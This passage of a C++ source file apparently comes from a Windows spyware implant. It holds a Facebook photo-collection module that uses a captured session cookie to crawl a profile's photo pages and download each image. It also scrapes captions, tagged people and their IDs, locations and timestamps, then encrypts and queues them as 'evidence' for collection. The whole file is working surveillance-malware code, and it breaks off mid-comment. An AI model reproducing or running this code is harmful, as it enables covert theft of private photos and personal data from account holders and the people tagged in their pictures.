#include <Windows.h>
#include <WinInet.h>
#include <string>


#include "photo.h"
#include "cookies.h"
#include "conf.h"
#include "facebook.h"
#include "globals.h"
#include "JSON.h"
#include "JSONValue.h"
#include "proto.h"
#include "social.h"
#include "utils.h"
#include "uthash.h"
#include "zmem.h"

#include "photo_facebook.h"


#ifdef _DEBUG
#include "debug.h"
#endif


#define URL_SIZE_IN_CHARS	2048

/* facebook defines  */
#define FBID_TAG			 "data-fbid=\""
#define FBID_TOKEN			 "\"token\":\""
#define FBID_PHOTO_URL		 "id=\"fbPhotoImage\" src=\"https://"
#define FBID_PHOTO_CAPTION   "<span class=\"hasCaption\">"
#define FBID_PHOTO_TAG_LIST	 "<span class=\"fbPhotoTagList\" id=\"fbPhotoPageTagList\">"
#define FBID_PHOTO_TAG_ITEM  "<span class=\"fbPhotoTagListTag tagItem\">"
#define FBID_PHOTO_LOCATION  "<span class=\"fbPhotoTagListTag withTagItem tagItem\">"
#define FBID_PHOTO_TIMESTAMP "fbPhotoPageTimestamp"

typedef struct _facebook_photo_id {
	UINT64	fbid;			// key
#define PHOTOS_YOURS	0
#define PHOTOS_OF_YOU	1
	DWORD   dwType;			
	UT_hash_handle hh;		// handle
} facebook_photo_id;

typedef struct _facebook_placeId_to_location {
	UINT64 placeId;   // key
	FLOAT  latitude;
	FLOAT  longitude;
	UT_hash_handle hh;
} facebook_placeId_to_location;

/* start of string utils*/
bool replace(std::string& str, const std::string& from, const std::string& to) {
    size_t start_pos = str.find(from);
    if(start_pos == std::string::npos)
        return false;
    str.replace(start_pos, from.length(), to);
    return true;
}

void replaceAll(std::string& str, const std::string& from, const std::string& to) {
    if(from.empty())
        return;
    size_t start_pos = 0;
    while((start_pos = str.find(from, start_pos)) != std::string::npos) {
        str.replace(start_pos, from.length(), to);
        start_pos += to.length(); 
    }
}
/* end of string utils */

/* start of facebook photo handling functions */

/* 
	Description:	extracts the photo blob from a Facebook photo specific page
	Params:			Facebook cookie, photo specific page, returned size of the blog, returned path (URL) of the blob
	Usage:			returns null or a buffer containing the image that must be freed by the caller, strPhotoBlobPath must be freed by the caller if not null. 
					Input page is modified temporary.
*/
LPBYTE FacebookPhotoExtractPhotoBlob(__in LPSTR strCookie, __in LPSTR strHtmlPage, __out PULONG uSize, __out LPSTR *strPhotoBlobPath)
{
	/* 
		allocations: 
		- strUrl is allocated and free'd accordingly
		- strRecvPhoto is allocated and returned to the caller if not NULL
		- strPhotoBlobPath is allocated and returned to the caller if not NULL
	*/
	
	LPSTR strParser1, strParser2;
	CHAR chTmp;

	/*	photo url follows id="fbPhotoImage": 
			<img class="fbPhotoImage img" id="fbPhotoImage" src="https://scontent-b.xx.fbcdn.net/hphotos-xpf1/v/t1.0-9/10409298_1588556341373553_8673446508125364435_n.jpg?oh=122bdc630c330a300e034afee9ead8a0&amp;oe=55290EDD" alt="">  
	*/ 
	strParser1 = strstr(strHtmlPage, FBID_PHOTO_URL);
	if (!strParser1)
		return NULL;

	strParser1 += strlen(FBID_PHOTO_URL);

	strParser2 = strstr(strParser1, "\"");
	if (!strParser2)
		return NULL;

	/* temporary change input page */
	chTmp = *strParser2;
	*strParser2 = NULL;

	
	/* poor man html unescape, replace the ampersand in the url: &amp; -> & */
	std::string tmp(strParser1);
	replaceAll(tmp, "&amp;", "&");
	LPCSTR szUnescapedUrl = tmp.c_str();

	LPWSTR strUrl = (LPWSTR) zalloc_s(URL_SIZE_IN_CHARS  * sizeof(WCHAR));
	if (!strUrl)
		return NULL;

	/* save the complete url, break it down for request next */
	_snwprintf_s(strUrl, URL_SIZE_IN_CHARS, _TRUNCATE, L"%S", szUnescapedUrl );

	/* restore input page */
	*strParser2 = chTmp;

#ifdef _DEBUG
	OutputDebug(L"[*] %S - photo url: %s\n", __FUNCTION__, strUrl);
#endif

	/* copy url into the out parameter*/
	*strPhotoBlobPath = (LPSTR) zalloc_s(strlen(szUnescapedUrl) + 1);
	if (*strPhotoBlobPath)
		strncpy_s(*strPhotoBlobPath, strlen(szUnescapedUrl) + 1, szUnescapedUrl, _TRUNCATE);
	
	/*	strUrl is "scontent-b.xx.fbcdn.net/hphotos-xpf...."
		null-out the first '/' and obtain domain-NULL-relative 
		strUrl will hold the domain
		strUrlRelative will hold the relative part, WinHTTP can handle the missing '/'
	*/
	LPWSTR strUrlRelative = StrStrW(strUrl, L".net");
	if (!strUrlRelative)
	{
		zfree_s(strUrl);
		return NULL;
	}

	strUrlRelative += wcslen(L".net");
	*strUrlRelative = NULL;
	strUrlRelative +=1;


	LPBYTE strRecvPhoto = NULL;
	DWORD dwBuffSize = 0;
	DWORD dwRet = HttpSocialRequest(strUrl, L"GET", strUrlRelative, 443, NULL, 0, &strRecvPhoto, &dwBuffSize, strCookie);
	*uSize = dwBuffSize;
	zfree_s(strUrl);
	
#ifdef _DEBUG
	if (strRecvPhoto)
		HexDump(L"[*] Facebook Photo header", strRecvPhoto, 48);
#endif

	if (strRecvPhoto)
		return strRecvPhoto;
	else
		return NULL;
}


/*
	Description:	extracts the caption from a Facebook photo specific page
	Params:			Facebook photo specific page
	Usage:			returns null or a string containing the caption, which must be freed by the caller. Input page is modified temporary.
*/
LPSTR FacebookPhotoExtractPhotoCaption(LPSTR strHtmlPage)
{
	/*
		allocations:
			- strCaption is allocated and returned to the caller if not NULL

	*/

	LPSTR strParser1, strParser2;
	CHAR chTmp;
	LPSTR strCaption = NULL;

	/*  caption, if any, follows span class="hasCaption": 
			<span class="hasCaption"> <br>very serious</span> 
	*/ 

	strParser1 = strstr(strHtmlPage, FBID_PHOTO_CAPTION);
	if (strParser1)
	{
		strParser1 += strlen(FBID_PHOTO_CAPTION);
		strParser1 = strstr(strParser1, ">"); // skip <br>
		
		if (!strParser1)
			return NULL;

		strParser1 +=1;

		strParser2 = strstr(strParser1, "</");

		if (strParser2)
		{

			/* temporary change input page */
			chTmp = *strParser2;
			*strParser2 = NULL;

#ifdef _DEBUG
			OutputDebug(L"[*] %S - caption: %S %d\n", __FUNCTION__, strParser1, strlen(strParser1));
#endif

			size_t length = strlen(strParser1) + 1;
			strCaption = (LPSTR) zalloc_s(length);
		
			if (!strCaption)
				return NULL;

			std::string tmp(strParser1);
			replaceAll(tmp, "\"", "\\\"");
			LPCSTR szUnescapedUrl = tmp.c_str();

			strncpy_s(strCaption, length, szUnescapedUrl, _TRUNCATE);
			

			/* restore input page */
			*strParser2 = chTmp;
		}

	}

	return strCaption;
}

/*
	Description:	extracts tags from a Facebook photo specific page
	Params:			Facebook photo specific page
	Usage:			returns null or a buffer containing a list of tags, which must be freed by the caller. Input page is modified temporary.
					
					Array of tags has the format 'name, facebook_id;..', when facebook_id is not available it's set to null:
					- johnny,12341234;begoode,null;unknown,null 	

					Assumptions:
					- Facebook names/handles can't contain ',' or ';'
*/
LPSTR FacebookPhotoExtractPhotoTags(LPSTR strHtmlPage)
{
	/*
		allocations:
			- strTags is reallocated within a loop and returned to the caller if not NULL
	*/

	LPSTR strParser1, strParser2, strParserInner1, strParserInner2;
	CHAR chTmp, chTmpInner;
	LPSTR strTags = NULL;

	/*  other people tag:

			everything will be within <span class="fbPhotoTagList" id="fbPhotoPageTagList">..</span>:
	
			- not registered in Facebook
				<span class="fbPhotoTagListTag tagItem"><input type="hidden" autocomplete="off" name="tag[]" value="1588556671373520"><a class="textTagHovercardLink taggee" data-tag="1588556671373520" data-hovercard="/ajax/hovercard/hovercard.php?id=1588556671373520&amp;type=mediatag&amp;media_info=0.1588556341373553" aria-owns="js_e" aria-haspopup="true" id="js_f">Bloody Abu Dhabi</a></span>
			
			- registered in Facebook
				<span class="fbPhotoTagListTag tagItem"><input type="hidden" autocomplete="off" name="tag[]" value="100003663718866"><a class="taggee" href="https://www.facebook.com/antroide.succhienmberg" data-tag="100003663718866" data-hovercard="/ajax/hovercard/hovercard.php?id=100003663718866&amp;type=mediatag&amp;media_info=0.1588556338040220" aria-owns="js_9" aria-haspopup="true" id="js_a">Antroide Succhienmberg</a></span>
	*/
	strParser1 = strstr(strHtmlPage, FBID_PHOTO_TAG_LIST);
	if (strParser1)
	{
		/* loop through the tag list */
		while (TRUE)
		{
			strParser1 = strstr(strParser1, FBID_PHOTO_TAG_ITEM);
			
			if (!strParser1) // if we can't find a tag item, bail 
				break;

			strParser1 += strlen(FBID_PHOTO_TAG_ITEM);

			strParser2 = strstr(strParser1, "</span>");

			if (!strParser2) 
				break;

			/* temporary change input page */
			chTmp = *strParser2;
			*strParser2 = NULL;

			/* advance strParser1 skipping <input ...>, can skip the return value check */
			strParser1 = strstr(strParser1, ">") + 1;  
			

#ifdef _DEBUG
			OutputDebug(L"[*] %S - tag item: %S\n", __FUNCTION__, strParser1);
#endif


			/* a] fetch taggee facebook id if available, 'null' otherwise */
			CHAR strFacebookId[256] = {'n', 'u', 'l', 'l', 0};

			if (strstr(strParser1, "class=\"taggee\""))
			{		/* registered user fetch the id */
					 strParserInner1 = strstr(strParser1, "data-tag=\"");
					 strParserInner1 += strlen("data-tag=\"");

					 if (strParserInner1)
					 {
						 strParserInner2 = strstr(strParserInner1, "\"");

						 /* temporary change input page */
						 chTmpInner = *strParserInner2;
						 *strParserInner2 = NULL;

						 strncpy_s(strFacebookId, 256, strParserInner1, _TRUNCATE);
						 

						 /* restore input page */
						 *strParserInner2 = chTmpInner;
					 }
			
			}

			/* b] fetch taggee name */
			CHAR strTaggeeName[512] = {'u', 'n', 'k', 'n', 'o', 'w', 'n', 0}; 

			strParserInner1 = strstr(strParser1, ">");
			if (strParserInner1)
			{
				strParserInner1 +=1;

				strParserInner2 = strstr(strParserInner1, "<");

				/* temporary change input page */
				 chTmpInner = *strParserInner2;
				 *strParserInner2 = NULL;

				 strncpy_s(strTaggeeName, 512, strParserInner1, _TRUNCATE);

				 /* restore input page */
				 *strParserInner2 = chTmpInner;

			}

#ifdef _DEBUG
			OutputDebug(L"[*] %S - taggee -> %S id -> %S\n", __FUNCTION__, strTaggeeName, strFacebookId);
#endif

			/* restore input page */
			*strParser2 = chTmp;

			/* prepare for next loop */
			strParser1 = strParser2;


			/* save new record */
			size_t tags_size = 0, old_tags_size = 0;
			
			// determine new buffer size and increase allocated space accordingly
			if (strTags)
				old_tags_size += strlen(strTags);

			tags_size = old_tags_size + strlen(strTaggeeName) + strlen(strFacebookId) + 3; // 3 = comma + semicolon + NULL
			strTags = (LPSTR) realloc(strTags, tags_size); 

			// if allocation failed return either what has been allocated so far or NULL
			if (!strTags)
				return strTags;

			// initialize to 0 before first record strcat_s
			if (!old_tags_size)
				SecureZeroMemory(strTags, tags_size);

			// append strings
			strcat_s(strTags, tags_size, strTaggeeName);
			strcat_s(strTags, tags_size, ",");
			strcat_s(strTags, tags_size, strFacebookId);
			strcat_s(strTags, tags_size, ";");


#ifdef _DEBUG
			OutputDebug(L"[*] %S - record updated: %S\n", __FUNCTION__, strTags);
#endif
		}
	}

	return strTags;
}

/*
	Description:	extracts the location from a Facebook photo specific page
	Params:			Facebook cookie, Facebook photo specific page
	Usage:			returns null or a string containing the location, which must be freed by the caller. Input page is modified temporary.

					location format is latitude,longitude:
					45.0,-9.1
*/
LPSTR FacebookPhotoExtractPhotoLocation(__in LPSTR strCookie, __in LPSTR strHtmlPage, facebook_placeId_to_location *idToLocation_hash_head)
{
	/*	
		allocations:
			- a page is fetched and free'd
			- strLocation is allocated and returned to the caller if not NULL
	*/

	LPSTR strParser1, strParser2;
	CHAR chTmp;
	LPSTR strLocation = NULL;

	/*	location:
			a]	find
				<span class="fbPhotoTagListTag withTagItem tagItem"><input type="hidden" autocomplete="off" name="tag[]" value="231160113588411"><a class="taggee" href="https://www.facebook.com/pages/Nurburgring-Nordschleife/231160113588411?ref=stream" data-hovercard="/ajax/hovercard/page.php?id=231160113588411" aria-owns="js_9" aria-haspopup="true" id="js_a">Nurburgring Nordschleife</a></span>
			
			b]	value s.a. 231160113588411 is the placeId and key idToLocation_hash_head
	*/

	strParser1 = strstr(strHtmlPage, FBID_PHOTO_LOCATION);
	if (strParser1)
	{
		/* a] */
		strParser1 += strlen(FBID_PHOTO_LOCATION);
		strParser1 = strstr(strParser1, "value=\"");
		if (!strParser1)
			return NULL;
		
		strParser1 += strlen("value=\"");
		
		strParser2 = strstr(strParser1, "\"");
		if (!strParser2)
			return NULL;
		
		
		/* temporary change input page */
		chTmp = *strParser2;
		*strParser2 = NULL;

#ifdef _DEBUG
		OutputDebug(L"[*] %S - place id : %S\n", __FUNCTION__, strParser1);
#endif
		
		UINT64 thisPlaceId = _strtoui64(strParser1, NULL, 10);
		if (!thisPlaceId)
			return NULL;

		facebook_placeId_to_location *findMe = NULL;
		HASH_FIND(hh, idToLocation_hash_head, &thisPlaceId, sizeof(UINT64), findMe);

		if (findMe == NULL)
			return NULL;

		/* prepare full string */
		strLocation = (LPSTR) zalloc_s(64); 
		if (strLocation)
			_snprintf_s(strLocation, 64, _TRUNCATE, "%f,%f", findMe->latitude, findMe->longitude );


#ifdef _DEBUG
		OutputDebug(L"[*] %S - coordinates id : %f - %f\n", __FUNCTION__, findMe->latitude, findMe->longitude);
#endif

		/* restore input page */
		*strParser2 = chTmp;

	}

	return strLocation;
}

/*
	Description:	extracts the epoch timestamp  from a Facebook photo specific page
	Params:			Facebook photo specific page
	Usage:			returns null or a string containing the epoch timestamp, which must be freed by the caller. Input page is modified temporary.
					
*/
LPSTR FacebookPhotoExtractTimestamp(__in LPSTR strHtmlPage)
{
	/* allocations:
		- strTimestamp is allocated and returned to the caller
	*/

	LPSTR strParser1, strParser2;
	CHAR chTmp;
	LPSTR strTimestamp = NULL;

	strParser1 = strstr(strHtmlPage, FBID_PHOTO_TIMESTAMP);
	if (!strParser1)
		return NULL;
	
	strParser1 += strlen(FBID_PHOTO_TIMESTAMP);
	strParser1 = strstr(strParser1, "data-utime=\"");
	if (!strParser1)
		return NULL;

	strParser1 += strlen("data-utime=\"");

	strParser2 = strstr(strParser1, "\"");
	if (!strParser2)
		return NULL;

	/* temporary change input page */
	chTmp = *strParser2;
	*strParser2 = NULL;

#ifdef _DEBUG
	OutputDebug(L"[*] %S - timestamp url: %S\n", __FUNCTION__, strParser1);
#endif

	size_t timestampLength = strlen(strParser1) + 1;
	strTimestamp = (LPSTR) zalloc_s(timestampLength);
	if (!strTimestamp)
		return NULL;

	strncpy_s(strTimestamp, timestampLength, strParser1, _TRUNCATE);

	/* restore input page */
	*strParser2 = chTmp;

	return strTimestamp;
}


/*
	Description:	append to strAppendMe a snprintf' of strFormat and strConsumed
	Params:			string to be appended, format string with a %s (e.g. \"description\": \"%s\", ";), string sprintf'd into the format string
	Usage:			changes strAppendMe, by reallocating  and appending.

*/
VOID FacebookPhotoLogJsonAppend(LPSTR* strAppendMe, __in LPCSTR strFormat, __in LPSTR strConsumed)
{
	/*	allocations:
		- strTemp is allocated and free'd
		- strAppendMe is reallocated		
	*/

	if (!*strAppendMe  || !strFormat || !strConsumed)
		return;

	size_t strJsonLogSize = 0;
	LPSTR strTemp = NULL;
	size_t tempSize = strlen(strConsumed) + strlen(strFormat) -2 + 1; // -2: %s , +1: null
	strTemp = (LPSTR) zalloc_s(tempSize);
	if (strTemp)
	{
		_snprintf_s(strTemp, tempSize, _TRUNCATE, strFormat, strConsumed);

		strJsonLogSize = strlen(strTemp) + strlen(*strAppendMe) + 1;
		*strAppendMe = (LPSTR) realloc(*strAppendMe, strJsonLogSize);

		if (*strAppendMe)
			strncat_s(*strAppendMe, strJsonLogSize, strTemp, _TRUNCATE);

		zfree_s(strTemp);
	}
		
}

/* 
	Description:	prepare and queue a complete photo log (blob + metadata) for a single fbid
	Params:			photo blob, its size, caption, tags, location, path, timestamp
	Usage:			-
					
*/
VOID FacebookPhotoLog(__in LPBYTE lpPhotoBlob, __in ULONG uSize, __in LPSTR strCaption, __in LPSTR strTags, __in LPSTR strLocation, __in LPSTR strPhotoPath, __in LPSTR strTimestamp)
{
	/* allocations:
		- strJsonLog contain the full json log and before queuing the evidence the null termination is removed, beware
	*/
	LPSTR strJsonLog = NULL;
	size_t strJsonLogSize = 0;

	// photo blob is mandatory
	if (!lpPhotoBlob)
		return;

	// program
	LPCSTR strProgramJson = "{ \"program\": \"Facebook\", \"device\": \"Desktop\", ";
	size_t programSize = strlen(strProgramJson) + 1;
	strJsonLog = (LPSTR) zalloc_s(programSize);
	if (strJsonLog)
		strncpy_s(strJsonLog, programSize, strProgramJson, _TRUNCATE);
		
	// path
	if (strPhotoPath)
	{
		LPCSTR strCaptionTemplate = "\"path\": \"%s\", ";
		FacebookPhotoLogJsonAppend(&strJsonLog, strCaptionTemplate, strPhotoPath);
	}

	// caption
	if (strCaption)
	{
		LPCSTR strCaptionTemplate = "\"description\": \"%s\", ";
		FacebookPhotoLogJsonAppend(&strJsonLog, strCaptionTemplate, strCaption);
	}

	// tags
	if (strTags)
	{
		// "convert johnny,12341234;begoode,null;" to [{"name":"johnny", "handle":"12341234"},{"name":"begoode"}]
		LPSTR strContext = NULL;
		LPSTR strRecord = strtok_s(strTags, ";", &strContext);
		size_t strTagJsonSize = 0;

		LPSTR strTagJson = (LPSTR) zalloc_s(4);

		if (strTagJson)
		{
			_snprintf_s(strTagJson, 4, _TRUNCATE, "[");

			while (strRecord != NULL)
			{

				LPSTR strHandle = strstr(strRecord, ",");
				if (strHandle) // verify handle is kosher
				{
					*strHandle = NULL;
					strHandle +=1;

					// strRecord points to taggee name, strHandle to its handle, if any
					LPCSTR strTaggeeTemplate = "{\"name\": \"%s\"";
					FacebookPhotoLogJsonAppend(&strTagJson, strTaggeeTemplate, strRecord);

					if ( strcmp(strHandle, "null") )
					{
						// we've a handle
						LPCSTR strHandleTemplate = ", \"handle\": \"%s\", \"type\": \"facebook\"";
						FacebookPhotoLogJsonAppend(&strTagJson, strHandleTemplate, strHandle);
					} 

					// close the record with "},"
					strTagJsonSize = strlen(strTagJson) + 1 + 2; // null + },
					strTagJson = (LPSTR) realloc(strTagJson, strTagJsonSize);
					if (strTagJson)
						strncat_s(strTagJson, strTagJsonSize, "},", _TRUNCATE);
				}
				strRecord = strtok_s(NULL, ";", &strContext);
			}

			// overwrite last "," and close the record with "],"
			LPSTR strComma = strrchr(strTagJson, ',');
			if (strComma)
				*strComma = ' ';

			
			// prepare the final json 
			LPCSTR strTagsTemplate = "\"tags\": %s], ";
			FacebookPhotoLogJsonAppend(&strJsonLog, strTagsTemplate, strTagJson);

			zfree_s(strTagJson);
		}
	}

	// location
	if (strLocation)
	{
		// convert "45.0,-9.1" to {"lat": 45.0, "lon": 9.1, "r": 50}
		LPSTR strLongitude = strstr(strLocation, ",");
		LPSTR strLocationJson = NULL;
		
		if (strLongitude)
		{
			strLocationJson = (LPSTR) zalloc_s(4);
			if (strLocationJson)
			{
				_snprintf_s(strLocationJson, 4, _TRUNCATE, "{");
				
				*strLongitude = NULL;
				strLongitude +=1;

				// strLocation points to lat value, strLongitude points to lon value
				FacebookPhotoLogJsonAppend(&strLocationJson, "\"lat\": %s, ", strLocation);

				FacebookPhotoLogJsonAppend(&strLocationJson, "\"lon\": %s, \"r\": 50}", strLongitude);

				LPCSTR strLocationTemplate = "\"place\": %s, ";
				FacebookPhotoLogJsonAppend(&strJsonLog, strLocationTemplate, strLocationJson);

				zfree_s(strLocationJson);
			}
		}
	}

	// timestamp
	if (strTimestamp)
	{
		LPCSTR strTimestampTemplate = "\"time\": %s, ";
		FacebookPhotoLogJsonAppend(&strJsonLog, strTimestampTemplate, strTimestamp);
	}

	// close json

#ifdef _DEBUG
	OutputDebug(L"[*] %S - json log: %S\n", __FUNCTION__, strJsonLog);
#endif

	strJsonLogSize = strlen(strJsonLog);
	CHAR* strReplace = strrchr(strJsonLog, ',');
	if (strReplace)
	{
		// N.B.: from now on strJsonLog is not NULL terminated anymore
		// length is 3 because we're replacing ", " + NULL, which terminates every partial json string 
		CHAR a[] = { '}', ' ', ' ' };  
		memcpy_s(strReplace, 3, &a, 3);
	}
	
	

	size_t additionalHeaderSize = sizeof(PHOTO_ADDITIONAL_HEADER) + strJsonLogSize;
	LPPHOTO_ADDITIONAL_HEADER lpPhotoAdditionalHeader = (LPPHOTO_ADDITIONAL_HEADER) zalloc_s(additionalHeaderSize);

	lpPhotoAdditionalHeader->uVersion = LOG_PHOTO_VERSION;
	memcpy_s(lpPhotoAdditionalHeader->strJsonLog, strJsonLogSize, strJsonLog, strJsonLogSize);


	DWORD dwEvSize;
	LPBYTE lpEvBuffer = PackEncryptEvidence(uSize, lpPhotoBlob, PM_PHOTO, (LPBYTE) lpPhotoAdditionalHeader, additionalHeaderSize, &dwEvSize);
	
	zfree_s(lpPhotoAdditionalHeader);

	/* queue the evidence */
	if (!QueuePhotoLog(lpEvBuffer, dwEvSize))
		zfree_s(lpEvBuffer);

	/* cleanup */
	zfree_s(strJsonLog);


}

/*
	Description:	fetches Facebook photo blob and its metadata and then queues the evidence 
	Params:			valid Facebook cookie, struct for fbid
	Usage:			-
*/
VOID FacebookPhotoHandleSinglePhoto(__in LPSTR strCookie,  facebook_photo_id *fbid, facebook_placeId_to_location *idToLocation_hash_head)
{

	/*	
		a] fetch page:
			url format:
			https://www.facebook.com/photo.php?fbid=1588556338040220 
	*/

	LPWSTR strUrl = (LPWSTR) zalloc_s(URL_SIZE_IN_CHARS  * sizeof(WCHAR));
	if (!strUrl)
		return;

	_snwprintf_s(strUrl, URL_SIZE_IN_CHARS , _TRUNCATE, L"/photo.php?fbid=%I64d",  fbid->fbid);
	
	LPSTR strRecvBuffer = NULL;
	DWORD dwBuffSize;
	DWORD dwRet = HttpSocialRequest(L"www.facebook.com", L"GET", strUrl, 443, NULL, 0, (LPBYTE *)&strRecvBuffer, &dwBuffSize, strCookie);
	zfree_s(strUrl);

	if (dwRet != SOCIAL_REQUEST_SUCCESS)
		return;


	/* strip hidden_elem */
	std::string tmpSanitize(strRecvBuffer);
	replaceAll(tmpSanitize, " hidden_elem", "");
	replaceAll(tmpSanitize, "hidden_elem ", "");
	replaceAll(tmpSanitize, " hidden_elem ", "");
	LPSTR facebookPhotoPageSanitized = _strdup(tmpSanitize.c_str());

	if( facebookPhotoPageSanitized == NULL)
	{
		zfree_s(strRecvBuffer);
		return;
	}
	

	/*	b] mandatory - retrieve the photo blob and its path */ 
	ULONG uSize = 0;
	LPSTR strPhotoBlobPath = NULL;
	LPBYTE strRecvPhoto = FacebookPhotoExtractPhotoBlob(strCookie, facebookPhotoPageSanitized, &uSize, &strPhotoBlobPath);


	/*  c] optional - caption	*/ 
	LPSTR strCaption = FacebookPhotoExtractPhotoCaption(facebookPhotoPageSanitized);


	/*  d] optional - other people tag	*/
	LPSTR strTags = FacebookPhotoExtractPhotoTags(facebookPhotoPageSanitized);
	
	/*	e] optional - location */
	LPSTR strLocation = FacebookPhotoExtractPhotoLocation(strCookie, facebookPhotoPageSanitized, idToLocation_hash_head);

	/*  f] optional - timestamp */
	LPSTR strEpochTimestamp = FacebookPhotoExtractTimestamp(facebookPhotoPageSanitized);

	/* log all the things */
	FacebookPhotoLog(strRecvPhoto, uSize, strCaption, strTags, strLocation, strPhotoBlobPath, strEpochTimestamp);

	/* cleanup */
	if (strRecvPhoto)
		zfree_s(strRecvPhoto);

	if (strPhotoBlobPath)
		zfree_s(strPhotoBlobPath);

	if (strCaption)
		zfree_s(strCaption);

	if (strTags)
		zfree_s(strTags);

	if (strLocation)
		zfree_s(strLocation);

	if (strEpochTimestamp)
		zfree_s(strEpochTimestamp);
	
	zfree_s(strRecvBuffer); 
	zfree_s(facebookPhotoPageSanitized);
}

/*
	Description:	parse StrContainingFbids and inserts fbids found into hash_head
	Params:			string containg fbids, pointer to hash head, type of fbid
	Usage:			new fbids are allocated and inserted into hash_head, StrContainingFbids temporarily changed 
*/
VOID FacebookPhotoExtractFbidsFromPage(__in LPSTR StrContainingFbids, facebook_photo_id **hash_head, DWORD dwFbidType)
{
	LPSTR strPhotoParser1, strPhotoParser2;
	CHAR strFbid[32]; 

	strPhotoParser1 = StrContainingFbids;
	while (TRUE)
	{
		strPhotoParser1 = strstr(strPhotoParser1, FBID_TAG);
		if (!strPhotoParser1)
			break;

		strPhotoParser1 += strlen(FBID_TAG);

		strPhotoParser2 = strstr(strPhotoParser1, "\"");
		if (!strPhotoParser2)
			break;

		*strPhotoParser2 = NULL;
		_snprintf_s(strFbid, sizeof(strFbid), "%s", strPhotoParser1);
		strPhotoParser1 = strPhotoParser2 + 1;

		facebook_photo_id *fbid_new = (facebook_photo_id*) zalloc_s(sizeof(facebook_photo_id));
		fbid_new->fbid = _strtoui64(strFbid, NULL, 10);
		fbid_new->dwType = dwFbidType;

#ifdef _DEBUG
		OutputDebug(L"[*] %S - fbid: %I64d count: %d\n",  __FUNCTION__, fbid_new->fbid, HASH_COUNT(*hash_head));
#endif

		facebook_photo_id *fbid_tmp = NULL;
		HASH_FIND(hh, *hash_head, &fbid_new->fbid, sizeof(UINT64), fbid_tmp);

		if (fbid_tmp == NULL) {
			HASH_ADD(hh, *hash_head, fbid, sizeof(UINT64), fbid_new);
		} else {
			zfree_s(fbid_new);
		}

	}
		
}

/*
	Description:	crawls from strPageContainingToken and inserts fbids found into hash_head
	Params:			valid Facebook cookie, Facebook user id, page containing TaggedPhotosAppCollectionPagelet token, pointer to hash head
	Usage:			new fbids are allocated and inserted into hash_head, strPageContainingToken temporarily changed 
*/
VOID FacebookPhotoCrawlPhotosOfYou(__in LPSTR strCookie, __in LPSTR strUserId, __in LPSTR strPageContainingToken, facebook_photo_id **hash_head)
{
	
	LPSTR strParser1, strParser2;
	CHAR chTmp;

	/*  Photos of You, e.g.:
		https://www.facebook.com/profile.php?id=100006576075695&sk=photos&collection_token=100006576075695%3A2305272732%3A4
		"controller": "TaggedPhotosAppCollectionPagelet"
		...
		"token": "100006576075695:2305272732:4", // using token 
		"href": "https:\/\/www.facebook.com\/profile.php?id=100006576075695&sk=photos&collection_token=100006576075695\u00253A2305272732\u00253A4", // ignore href, don't want to json unescape 
	*/

	/* a] fetch page with fbids */
	strParser1 = strstr(strPageContainingToken, "\"TaggedPhotosAppCollectionPagelet\"");
	if (!strParser1)
		return;

	strParser1 = strstr(strParser1, FBID_TOKEN);

	if (!strParser1)
		return;

	strParser1 += strlen(FBID_TOKEN);

	strParser2 = strstr(strParser1, "\",");
	if (!strParser2)
		return;
	
	/* temporary change input page */
	chTmp = *strParser2;
	*strParser2 = NULL;
	
	LPWSTR strUrlPhotos = (LPWSTR) zalloc_s(URL_SIZE_IN_CHARS * sizeof(WCHAR));
	if (!strUrlPhotos)
		return;

	_snwprintf_s(strUrlPhotos, URL_SIZE_IN_CHARS, _TRUNCATE, L"/profile.php?id=%S&sk=photos&collection_token=%S", strUserId, strParser1);

	/* restore input page */
	*strParser2 = chTmp;

#ifdef _DEBUG
	OutputDebug(L"[*] %S - photos of you: %s\n", __FUNCTION__, strUrlPhotos);
#endif

	LPSTR strRecvPhotoBuffer = NULL;
	DWORD dwBuffSize = 0;
	DWORD dwRet = HttpSocialRequest(L"www.facebook.com", L"GET", strUrlPhotos, 443, NULL, 0, (LPBYTE *)&strRecvPhotoBuffer, &dwBuffSize, strCookie);
	

	if (dwRet != SOCIAL_REQUEST_SUCCESS)
	{
		zfree_s(strUrlPhotos);
		return;
	}

	/*	b] collect fbids 
		e.g. data-fbid="1588556341373553">
	*/

	FacebookPhotoExtractFbidsFromPage(strRecvPhotoBuffer, hash_head, PHOTOS_OF_YOU);
	
	/* cleanup */
	zfree_s(strRecvPhotoBuffer);
	zfree_s(strUrlPhotos);	
}

/*
	Description:	crawls from strPageContainingToken and inserts fbids found into hash_head
	Params:			valid Facebook cookie, Facebook user id, page containing AllPhotosAppCollectionPagelet token, pointer to hash head
	Usage:			new fbids are allocated and inserted into hash_head, strPageContainingToken temporarily changed

*/
VOID FacebookPhotoCrawlYourPhotos(__in LPSTR strCookie, __in LPSTR strUserId, __in LPSTR strPageContainingToken, facebook_photo_id **hash_head)
{
	LPSTR strParser1, strParser2;
	CHAR chTmp;

	/*  2] Your Photos, e.g.:
		https://www.facebook.com/profile.php?id=100006576075695&sk=photos&collection_token=100006576075695%3A2305272732%3A5
		"controller": "AllPhotosAppCollectionPagelet"
	*/

	/* 2a] fetch page with fbids */
	strParser1 = strstr(strPageContainingToken, "\"AllPhotosAppCollectionPagelet\"");
	if (!strParser1)
		return;

	strParser1 = strstr(strParser1, FBID_TOKEN);

	if (!strParser1)
		return;

	strParser1 += strlen(FBID_TOKEN);

	strParser2 = strstr(strParser1, "\",");
	if (!strParser2)

		return;
	
	/* temporary change input page */
	chTmp = *strParser2;
	*strParser2 = NULL;
	
	LPWSTR strUrlPhotos = (LPWSTR) zalloc_s(URL_SIZE_IN_CHARS * sizeof(WCHAR));
	if (!strUrlPhotos)
		return;

	_snwprintf_s(strUrlPhotos, URL_SIZE_IN_CHARS, _TRUNCATE, L"/profile.php?id=%S&sk=photos&collection_token=%S", strUserId, strParser1);

	/* restore input page */
	*strParser2 = chTmp;

#ifdef _DEBUG
	OutputDebug(L"[*] %S - your photos: %s\n", __FUNCTION__, strUrlPhotos);
#endif

	LPSTR strRecvPhotoBuffer = NULL;
	DWORD dwBuffSize = 0;
	DWORD dwRet = HttpSocialRequest(L"www.facebook.com", L"GET", strUrlPhotos, 443, NULL, 0, (LPBYTE *)&strRecvPhotoBuffer, &dwBuffSize, strCookie);
	zfree_s(strUrlPhotos);

	if (dwRet != SOCIAL_REQUEST_SUCCESS)
		return;

	/* 2b] collect fbids 
		e.g. data-fbid="1588556341373553">
	*/

	FacebookPhotoExtractFbidsFromPage(strRecvPhotoBuffer, hash_head, PHOTOS_YOURS);
	zfree_s(strRecvPhotoBuffer);
	
}

/*
	Description:	crawls from strPageContainingToken and inserts fbids found into hash_head
